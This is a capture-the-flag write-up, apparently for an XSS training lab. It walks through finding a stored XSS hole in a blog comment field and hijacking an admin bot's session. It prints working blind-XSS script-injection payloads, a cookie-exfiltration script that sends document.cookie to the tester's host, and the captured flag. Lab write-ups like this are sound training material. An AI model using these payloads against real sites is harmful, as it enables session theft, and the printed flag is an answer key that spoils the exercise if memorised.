We are performing a **web application penetration testing task** for a company that has just launched its new `Security Blog`. As part of our web application penetration testing plan, we reached the phase where we must test the application for **Cross-Site Scripting (XSS)** vulnerabilities.

Start the server below, make sure you are connected to the VPN, and access the `/assessment` directory on the server using your browser:

<img src="/budahacksecurity/uploads/md_images/xss/x.png" style="max-width:100%; border-radius:8px;">

Apply the skills learned in this module to achieve the following:

1. Identify a user input field that is vulnerable to an XSS vulnerability
2. Find a working XSS payload that executes JavaScript code in the victim’s browser
3. Using **Session Hijacking** techniques, attempt to steal the victim’s cookies, which should contain the flag

---

## XSS Enumeration and Exploitation (Enhanced Markdown)

We discovered a **blog** where it is possible to post comments. The idea was to check whether any form field reflected unsanitized content (XSS) and, if so, **steal cookies** when a user (e.g., an admin/bot) viewed the comment.

---

## 1) Preparation: Start a server to receive callbacks

We started a simple HTTP server using PHP to monitor incoming requests from the victim:

```bash
sudo php -S 0.0.0.0:80
```

---

## 2) Initial XSS testing across form fields

We attempted to inject `<script>` tags that load different paths from our machine—one per form field (comment, name, email, website).
This allows us to identify **which field is rendered without filtering**, as we will see the corresponding `GET` request on our server.

Payloads used:

```bash
"><script src="http://10.10.14.17/comment"></script>
"><script src="http://10.10.14.17/name"></script>
"><script src="http://10.10.14.17/email"></script>
"><script src="http://10.10.14.17/website"></script>
```

> Note: the correct closing tag is `</script>` (not `</src>`).
> In some cases the browser may “recover,” but it’s best practice to use the valid syntax.

During submission, we noticed validation errors with the **email** field, so we used a fake but valid email address to avoid breaking the form validation.

---

## 3) Confirmation of the vulnerable field

When reviewing the server logs, we observed requests being made to `/website`, indicating that the content of the **website** field was executed in the browser (XSS confirmed):

```bash
[Fri Jan 16 20:25:04 2026] PHP 8.4.16 Development Server (http://0.0.0.0:80) started
[Fri Jan 16 20:28:04 2026] 10.129.91.169:35346 Accepted
[Fri Jan 16 20:28:04 2026] 10.129.91.169:35346 [404]: GET /website - No such file or directory
[Fri Jan 16 20:28:04 2026] 10.129.91.169:35346 Closing
[Fri Jan 16 20:28:05 2026] 10.129.91.169:35348 Accepted
[Fri Jan 16 20:28:05 2026] 10.129.91.169:35348 [404]: GET /website - No such file or directory
[Fri Jan 16 20:28:05 2026] 10.129.91.169:35348 Closing
```

The **404 error is expected**, since the `/website` file does not exist.
The important part is that **the request occurred**, proving execution of the injected `<script src=...>`.

---

## 4) Exploitation: Cookie theft using external JavaScript

To exfiltrate cookies, we created a file called `script.js` on our server containing a simple payload that sends `document.cookie` as a parameter to a URL we control.

**script.js**

```js
new Image().src = "http://10.10.14.17/index.php?c=" + encodeURIComponent(document.cookie);
```

> `encodeURIComponent()` ensures that special characters do not break the URL.

---

## 5) Loading the malicious script from the vulnerable field

Next, in the vulnerable field (**website**), we injected:

```bash
"><script src="http://10.10.14.17/script.js"></script>
```

When the victim (admin/bot) loaded the page containing our comment, the browser requested `script.js`, which then exfiltrated the cookies.

---

## 6) Capturing the flag in server logs

On our server, we observed the script being loaded and then the request containing the cookie/flag:

```bash
[Fri Jan 16 20:32:45 2026] 10.129.91.169:35536 [200]: GET /script.js
[Fri Jan 16 20:32:47 2026] 10.129.91.169:35538 [404]: GET /index.php?c=wordpress_test_cookie=WP%20Cookie%20check;%20wp-settings-time-2=1768613464;%20flag=HTB{cr055_5173_5cr1p71n6_n1nj4} - No such file or directory
```

Again, the **404 error does not matter**.
The goal was to **capture the value of the `c` parameter** in the server logs, where we successfully obtained the cookie and the flag:

```
HTB{cr055_5173_5cr1p71n6_n1nj4}
```


